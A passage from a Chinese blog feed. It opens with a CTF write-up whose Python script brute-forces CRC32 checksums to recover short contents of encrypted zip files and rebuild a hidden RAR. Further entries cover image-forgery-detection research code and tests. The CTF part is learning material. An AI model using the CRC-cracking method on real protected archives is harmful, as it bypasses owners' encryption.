src="https://img-blog.csdnimg.cn/20210405002535971.png"></p><p>这个就很难办了。</p><p>原来有一个叫CRC32校验码的东西。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210405002637256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 就是属性最后的那个东西。</p><p>之前有过拿相同校验码的文件，去破压缩包里的文件的题目，用到就是这个东西。<br> CRC32校验码就是用来检验文件内的数据是否正确的。</p><p>个人理解应该是做了一个<strong>不可逆的编码</strong>。</p><blockquote></blockquote><p>就像是有一个故事说的是:投标公司为了防止内鬼泄露价格消息，就做了一个“基于区块链的二次检验程序”。虽然不知道具体是怎么操作的。但是第一次提交要求把投递的计划书做一个不可逆加密。类似一个文件摘录吧。</p><p>信息不能从校验码复原，因为加密过程有损失，或者本来就没把完整的信息丢进去，但是可以从校验码发现信息是否有修改，因为校验码是以信息为明文加密的。</p><p>但是如果信息本身<strong>足够小</strong>，那么这个<strong>校验码就足够用来检验爆破的枚举的信息是否是原来的信息</strong>。真的是成也萧何，败也萧何。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python </span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># python3</span><br><span class="line">import zipfile</span><br><span class="line">import string</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def CrackCrc(crc):</span><br><span class="line">    for i in dic:</span><br><span class="line">        for j in dic:</span><br><span class="line">            for k in dic:</span><br><span class="line">                for h in dic:</span><br><span class="line">                    s = i + j + k + h</span><br><span class="line">                    if crc == (binascii.crc32(s.encode())):</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def CrackZip():</span><br><span class="line">    for i in range(0, 68):</span><br><span class="line">        file = &quot;C:/Users/brighten/Desktop/b2ca8799-13d7-45df-a707-94373bf2800c/&quot;+&#x27;out&#x27; + str(i) + &#x27;.zip&#x27;</span><br><span class="line">        crc = zipfile.ZipFile(file, &#x27;r&#x27;).getinfo(&#x27;data.txt&#x27;).CRC</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line">        print(&#x27;\r&#x27; + &quot;loading：&#123;:%&#125;&quot;.format(float((i + 1) / 68)), end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + &#x27;+/=&#x27;</span><br><span class="line">f = open(&#x27;out.txt&#x27;, &#x27;w&#x27;)</span><br><span class="line">print(&quot;\nCRC32begin&quot;)</span><br><span class="line">CrackZip()</span><br><span class="line">print(&quot;CRC32finished&quot;)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210405003830408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 就是做一个四重循环枚举所有的信息去和CRC32校验码对答案。</p><blockquote></blockquote><p>下面用来取出CRC32的数值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crc = zipfile.ZipFile(file, &#x27;r&#x27;).getinfo(&#x27;data.txt&#x27;).CRC</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote></blockquote><p>用来把枚举的字符串encode为 CRC32编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binascii.crc32(s.encode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后得到的BASE64编码的数据。</p><blockquote></blockquote><p>z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA&#x3D;&#x3D;</p><p>做BASE64解码，里面有可以识别的字符和一些意义不明的字符，就像是winhex的ASCII区一样，很想放到winhex里面。</p><p>这个文件里面能放txt文件，估计就是zip还是rar，反正也就那么两个常见。<br> 结果是RAR文件。</p><p>需要在前面加RAR的头<strong>52 61 72 21 1A 07 00</strong></p><blockquote></blockquote><p>还有的人说最后那么7个字节是RAR文件尾。<br> 好像和别的RAR文件不大一样。rar似乎是没有固定的文件尾。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2021040500525179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210405005437345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2021040501022919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D-net论文复现部分内容  --关于人工特征融入深度网络的思考。</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20D-net%E8%AE%BA%E6%96%87%E5%A4%8D%E7%8E%B0%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9%20%20--%E5%85%B3%E4%BA%8E%E4%BA%BA%E5%B7%A5%E7%89%B9%E5%BE%81%E8%9E%8D%E5%85%A5%E6%B7%B1%E5%BA%A6%E7%BD%91%E7%BB%9C%E7%9A%84%E6%80%9D%E8%80%83%E3%80%82/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20D-net%E8%AE%BA%E6%96%87%E5%A4%8D%E7%8E%B0%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9%20%20--%E5%85%B3%E4%BA%8E%E4%BA%BA%E5%B7%A5%E7%89%B9%E5%BE%81%E8%9E%8D%E5%85%A5%E6%B7%B1%E5%BA%A6%E7%BD%91%E7%BB%9C%E7%9A%84%E6%80%9D%E8%80%83%E3%80%82/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  D-net论文复现部分内容  –关于人工特征融入深度网络的思考。</p><h1 id="D-net论文复现部分内容-–关于人工特征融入深度网络的思考。"><a href="#D-net论文复现部分内容-–关于人工特征融入深度网络的思考。" class="headerlink" title="D-net论文复现部分内容  –关于人工特征融入深度网络的思考。"></a>D-net论文复现部分内容  –关于人工特征融入深度网络的思考。</h1><blockquote></blockquote><p>论文名：D-Unet: A Dual-encoder U-Net for Image SplicingForgery Detection and Localization</p><blockquote>arxiv 2020<p>复现时间 2021&#x2F;4&#x2F;24 使用pytorch<br> 这个论文的创新性不高，希望诸君绕过。论文甚至是把图片给写错了。实在是过分。</p><p>关于人工特征融入深度网络的思考。</p><p>使用某种图像库可以很轻易 的得到人工特征。</p><p>但是这个东西是用CPU计算的，而pytorch是拿GPU跑的。<br> 在实现上不是很难，就是注意CPU和Conda。<br> 但是把这玩意从CPU,GPU里面复制来，复制去 的。个人认为电脑会’累‘的，电脑肯定会累的，会跑的很慢。</p><p>下面是用这种很笨的方法实现的3重Harr小波。没有效率的方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#xioabo.py</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python </span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import numpy as np</span><br><span class="line">import pywt</span><br><span class="line">import cv2</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">import torch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def xiaob(img):</span><br><span class="line">    img=img.reshape(img.shape[1], img.shape[2],img.shape[3])</span><br><span class="line">    img = img.permute(1, 2, 0)</span><br><span class="line">    img=img.cpu().numpy()  # 把数据集中的tensor转numpy</span><br><span class="line">    # print(type(img2))</span><br><span class="line">    # img3 = cv2.resize(img2, (448, 448))</span><br><span class="line">    b, g, r = cv2.split(img)</span><br><span class="line">    x = (b, g, r)</span><br><span class="line">    count = 1</span><br><span class="line">    for img in x:</span><br><span class="line">        # plt.figure(&#x27;二维小波一级变换&#x27;)</span><br><span class="line">        coeffs = pywt.dwt2(img, &#x27;haar&#x27;)</span><br><span class="line">        cA, (cH, cV, cD) = coeffs</span><br><span class="line"></span><br><span class="line">        # 将各个子图进行拼接，最后得到一张图</span><br><span class="line">        &#x27;&#x27;&#x27;AH = np.concatenate([cA, cH], axis=1)</span><br><span class="line">        VD = np.concatenate([cV, cD], axis=1)</span><br><span class="line">        img = np.concatenate([AH, VD], axis=0)&#x27;&#x27;&#x27;</span><br><span class="line">        # 显示为灰度图</span><br><span class="line">        &#x27;&#x27;&#x27; plt.imshow(img, &#x27;gray&#x27;)</span><br><span class="line">        plt.title(&#x27;result&#x27;)</span><br><span class="line">        plt.show()&#x27;&#x27;&#x27;</span><br><span class="line">        cA = torch.from_numpy(cA)</span><br><span class="line">        cH = torch.from_numpy(cH)</span><br><span class="line">        cV = torch.from_numpy(cV)</span><br><span class="line">        cD = torch.from_numpy(cD)</span><br><span class="line">        cA = cA.resize(1, cA.shape[0], cA.shape[1])</span><br><span class="line">        cH = cH.resize(1, cH.shape[0], cH.shape[1])</span><br><span class="line">        cV = cV.resize(1, cV.shape[0], cV.shape[1])</span><br><span class="line">        cD = cD.resize(1, cD.shape[0], cD.shape[1])</span><br><span class="line"></span><br><span class="line">        if count == 1:</span><br><span class="line">            # y1 = (cV, cA, cH, cD)</span><br><span class="line">            # cv2.imshow(&quot;y1&quot;, cD)</span><br><span class="line">            outputs1 = torch.cat((cV, cA, cH, cD), dim=0)</span><br><span class="line">            k=cA</span><br><span class="line">            # print(outputs1.shape)</span><br><span class="line">        if count == 2:</span><br><span class="line">            # y2 = (cV, cA, cH, cD)</span><br><span class="line">            outputs2 = torch.cat((cV, cA, cH, cD), dim=0)</span><br><span class="line">            k = torch.cat((k, cA), dim=0)</span><br><span class="line">        if count == 3:</span><br><span class="line">            # y3 = (cV, cA, cH, cD)</span><br><span class="line">            outputs3 = torch.cat((cV, cA, cH, cD), dim=0)</span><br><span class="line">            k = torch.cat((k, cA), dim=0)</span><br><span class="line">        count += 1</span><br><span class="line">    out = (outputs1, outputs2, outputs3)</span><br><span class="line">    outputs = torch.cat(out, dim=0)</span><br><span class="line">    outputs=outputs.resize(1,outputs.shape[0], outputs.shape[1], outputs.shape[2])</span><br><span class="line">    k=k.resize(1,k.shape[0], k.shape[1], k.shape[2])</span><br><span class="line">    return (k.cuda(),outputs.cuda())  # 12层特征</span><br><span class="line"></span><br><span class="line"># 将多通道图像变为单通道图像</span><br><span class="line"># img = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY).astype(np.float32)</span><br><span class="line"># img = cv2.imread(&quot;C:/Users/brighten/Desktop/1.jpg&quot;)</span><br><span class="line">#img = torch.rand(size=(3,224, 224))</span><br><span class="line">#img=img.permute(1, 2, 0)</span><br><span class="line"># print(img.shape)</span><br><span class="line"># print(img)</span><br><span class="line">&#x27;&#x27;&#x27;k,y = xiaob(img)</span><br><span class="line">print(k.shape)</span><br><span class="line">print(y.shape)</span><br><span class="line"></span><br><span class="line">k,y = xiaob(k)</span><br><span class="line">print(k.shape)</span><br><span class="line">print(y.shape)&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># cv2.waitKey(0)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">(180, 130, 3)</span><br><span class="line">torch.Size([4, 90, 65])</span><br><span class="line">torch.Size([12, 90, 65])</span><br><span class="line"></span><br><span class="line">输入rgb 图像，（w,h,3）</span><br><span class="line">输出 tensor张量  (12,w/2,h/2)</span><br><span class="line">这两个表示图层的方式不一样</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">改后。</span><br><span class="line">输入张量  </span><br><span class="line"></span><br><span class="line">意思是把输入的张量按照numpy 的方式放置维度信息</span><br><span class="line">输出张量  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">大小同上</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CAT-Net- Compression Artifact Tracing Network 算法测试</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20CAT-Net-%20Compression%20Artifact%20Tracing%20Network%20%E7%AE%97%E6%B3%95%E6%B5%8B%E8%AF%95/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20CAT-Net-%20Compression%20Artifact%20Tracing%20Network%20%E7%AE%97%E6%B3%95%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  CAT-Net: Compression Artifact Tracing Network 算法测试</p><h1 id="CAT-Net-Compression-Artifact-Tracing-Network-算法测试"><a href="#CAT-Net-Compression-Artifact-Tracing-Network-算法测试" class="headerlink" title="CAT-Net: Compression Artifact Tracing Network 算法测试"></a>CAT-Net: Compression Artifact Tracing Network 算法测试</h1><blockquote></blockquote><p>2021年的开源图像篡改检测算法还是很难找的</p><p>这篇文章是 WACV2021 paper,作者是韩国人。</p><p>WACV据说是仅次于CVPR等的顶会。</p><p><a href="https://github.com/mjkwon2021/CAT-Net">https://github.com/mjkwon2021/CAT-Net</a><br> 这个东西直接在github 上面搜索名字竟然搜不到。<br> 但是会出现readme文档，在这个readme文档中点进去才会出现代码。</p><h2 id="算法训练使用的数据集"><a href="#算法训练使用的数据集" class="headerlink" title="算法训练使用的数据集"></a>算法训练使用的数据集</h2><p>最好不要使用下面的数据集进行测试<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/a3e34a4b84ae4c0794f96b7dca2b30e6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYnJpZ2h0ZW5kYXZpZA==,size_20,color_FFFFFF,t_70,g_se,x_16"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/0ab009028dec4bb6a719217959057948.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYnJpZ2h0ZW5kYXZpZA==,size_16,color_FFFFFF,t_70,g_se,x_16"></p><blockquote></blockquote><p><strong>对于一个培训集</strong> 使用以下数据集<br> auth.表示未篡改图像;tamp.表示篡改图像</p><h2 id="安装库版本"><a href="#安装库版本" class="headerlink" title="安装库版本"></a>安装库版本</h2><p>这些在requirements文件里面都有<br> torch&#x3D;&#x3D;1.1.0<br> Cython<br> pyyaml<br> yacs&gt;&#x3D;0.1.5<br> tqdm<br> torch_dct<br> pillow<br> opencv-python<br> tensorboardX<br> matplotlib<br> seaborn</p><h2 id="权重文件"><a href="#权重文件" class="headerlink" title="权重文件"></a>权重文件</h2><p>权重文件需要科学上网<br> Download weights from <a href="https://drive.google.com/drive/folders/1hBEfnFtGG6q_srBHVEmbF3fTq0IhP8jq?usp=sharing">link</a>.</p><p>link:<a href="https://drive.google.com/drive/folders/1hBEfnFtGG6q_srBHVEmbF3fTq0IhP8jq?usp=sharing">https://drive.google.com/drive/folders/1hBEfnFtGG6q_srBHVEmbF3fTq0IhP8jq?usp&#x3D;sharing</a><br> 是谷歌的下载地址。</p><p>百度云的下载地址在这里，模型很大，800M.</p><blockquote></blockquote><p>链接：<a href="https://pan.baidu.com/s/10hjC7u_lL8TX7NfPtioFzQ">https://pan.baidu.com/s/10hjC7u_lL8TX7NfPtioFzQ</a><br> 提取码：4tlj</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>在casia 数据集中，是非常惊艳的效果了。不如说这个效果过于惊艳了,和gt标注的完全相同。</p><p>但是也有在训练集中过拟合的嫌疑。</p><h3 id="casia-V2"><a href="#casia-V2" class="headerlink" title="casia V2"></a>casia V2</h3><p><img alt="请添加图片描述" src="https://img-blog.csdnimg.cn/8838b512005043c2a9a85beb9853f498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="请添加图片描述" src="https://img-blog.csdnimg.cn/5b3f706e3c7e4b0199a6d370ad20a6b5.png"></p><p><img alt="请添加图片描述" src="https://img-blog.csdnimg.cn/399382a8ea414b139ea1b2bc3dbe0fe6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="请添加图片描述" src="https://img-blog.csdnimg.cn/a8ea76da110542ebbe728144b993492c.png"></p><h3 id="coverage"><a href="#coverage" class="headerlink" title="coverage"></a>coverage</h3><p><img alt="请添加图片描述" src="https://img-blog.csdnimg.cn/575cfdcb97924cf99e9e5275b5667cbd.png"><br> <img alt="请添加图片描述" src="https://img-blog.csdnimg.cn/b5c92e89a83d4b76874abbddbbde883a.png"></p><p><img alt="请添加图片描述" src="https://img-blog.csdnimg.cn/b9c8a757bcd4474e97dc95b08aa5d70f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="请添加图片描述" src="https://img-blog.csdnimg.cn/c7ee3d9e61db4cebb0ae09e079e440ed.png"></p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9c060db2727947bf831272004c00be9b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYnJpZ2h0ZW5kYXZpZA==,size_20,color_FFFFFF,t_70,g_se,x_16"><br> COVERAGE数据集中的效果不是很好。说明此算法的泛化能力不好。在coverage的多数图像中都未能达到训练集（casia）中的效果。</p><h2 id="有一点要注意"><a href="#有一点要注意" class="headerlink" title="有一点要注意"></a>有一点要注意</h2><p>若输出为热力图，则输出为固定的某一大小。</p><p>若将灰度图保存出来，则<strong>分辨率为原图像的1&#x2F;4，长和宽都是1&#x2F;4.</strong></p><p>计算指标时候，需要进行resize,可能会有一些指标计算的损失，不过对于区域检测而言，几个像素的误差根本就不是问题。</p><h2 id="抗干扰性能"><a href="#抗干扰性能" class="headerlink" title="抗干扰性能"></a>抗干扰性能</h2><p>CASIA数据集某图像。<br> 应该是算法的一张训练图像。</p><p>发现，在旋转某些角度时，检测结果几乎完美，但是，但旋转超过180度，检测结果将会大打折扣。<br> 不明原因。原则上，DCT矩阵不会被旋转破坏的。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/329fa1e7a9db494b889d351e8732de4a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYnJpZ2h0ZW5kYXZpZA==,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p><img alt="请添加图片描述" src="https://img-blog.csdnimg.cn/fb9e3ba8f18840a8ae937e17fcbe22c3.png"><br> <img alt="请添加图片描述" src="https://img-blog.csdnimg.cn/e96fba891e954fe69c3a65ab740062b9.png"></p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hybrid LSTM and Encoder-Decoder Architecture for Detection of Image Forgeries运行测试</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Hybrid%20LSTM%20and%20Encoder-Decoder%20Architecture%20for%20Detection%20of%20Image%20Forgeries%E8%BF%90%E8%A1%8C%E6%B5%8B%E8%AF%95/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Hybrid%20LSTM%20and%20Encoder-Decoder%20Architecture%20for%20Detection%20of%20Image%20Forgeries%E8%BF%90%E8%A1%8C%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  Hybrid LSTM and Encoder-Decoder Architecture for Detection of Image Forgeries运行测试</p><h1 id="Hybrid-LSTM-and-Encoder-Decoder-Architecture-for-Detection-of-Image-Forgeries运行测试"><a href="#Hybrid-LSTM-and-Encoder-Decoder-Architecture-for-Detection-of-Image-Forgeries运行测试" class="headerlink" title="Hybrid LSTM and Encoder-Decoder Architecture for Detection of Image Forgeries运行测试"></a>Hybrid LSTM and Encoder-Decoder Architecture for Detection of Image Forgeries运行测试</h1><p>这篇论文的测试真的有点坑，作者使用的文件有点特殊。</p><p>简称为HLED网络。<br> read_me.md 的指示</p><h3 id="Resampling-Features"><a href="#Resampling-Features" class="headerlink" title="Resampling Features"></a>Resampling Features</h3><p>The codes for extracting resampling features can be found on “Radon” folder. Please change the input and output directory for your own dataset. Following is the command to extract the resampling features.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python extract_resamp_feat.py</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>In this code, the images are stored in hdf5 format. Please note that the package “pyfftw” are required to be installed before running the script. Please use the following command to install the package.</p><p>就是测试之前先运行 <strong>extract_resamp_feat.py</strong>文件，这个文件是提取图像特征用的。</p><p>会发现运行这个文件的时候会缺少一个库就是<strong>pysinogram</strong>，这个库是绝对搜不到的。好像是作者自己写的库，放在cmake里面。<br> 想了半天没想明白怎么装这个库。</p><h2 id="pysinogram"><a href="#pysinogram" class="headerlink" title="pysinogram"></a>pysinogram</h2><p>发现代码里面有这个东西。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2021071009021453.png">找到文件夹里面的pysingram.so文件。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210710090341563.png"><br> 需要在<strong>extract_resamp_feat.py</strong>文件的这一行之前</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sys.path.append(os.path.join(thispath, &#x27;build&#x27;))  # for importing pysinogram.so</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>加入thispath的路径。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thispath=r&quot;E:\pythonProject\复现算法\forgery_localization_HLED-master\Codes\radon_feat\cuda-radon-transform\build&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="数据集路径修改"><a href="#数据集路径修改" class="headerlink" title="数据集路径修改"></a>数据集路径修改</h2><p>把数据集转为h5py格式，再把路径改掉即可。</p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hybrid features and semantic reinforcement network for image forgery detection</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Hybrid%20features%20and%20semantic%20reinforcement%20network%20for%20image%20forgery%20detection/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Hybrid%20features%20and%20semantic%20reinforcement%20network%20for%20image%20forgery%20detection/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  Hybrid features and semantic reinforcement network for image forgery detection</p><h1 id="Hybrid-features-and-semantic-reinforcement-network-for-image-forgery-detection"><a href="#Hybrid-features-and-semantic-reinforcement-network-for-image-forgery-detection" class="headerlink" title="Hybrid features and semantic reinforcement network for image forgery detection"></a>Hybrid features and semantic reinforcement network for image forgery detection</h1><blockquote></blockquote><p>认为是2021年最靠谱的篡改检测类文章<br> 作者是吉林大学的</p><p><strong>代码未开源</strong></p><p>使用的线索为图像重采样特征和空间特征（像素关系）。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/3061026a1a314468b340331d22e380a8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 其实这个网络像是U-net的框架</p><h2 id="重采样特征"><a href="#重采样特征" class="headerlink" title="重采样特征"></a>重采样特征</h2><p>使用的是LSTM 网络，输入图为 256 * 256 分为的8 * 8个batch （32 * 32大小）。此信息流输出的仍旧是像素级别的分类，以前的论文会直接输出32 * 32块的分类。</p><h2 id="语义扩张（Semant-ic-reinforcement）"><a href="#语义扩张（Semant-ic-reinforcement）" class="headerlink" title="语义扩张（Semant*ic reinforcement）"></a>语义扩张（Semant*ic reinforcement）</h2><p>可以看作是跳跃连接，使用1*1卷积 改变了通道数</p><h2 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h2><p><img alt="在这里插入图片描述" 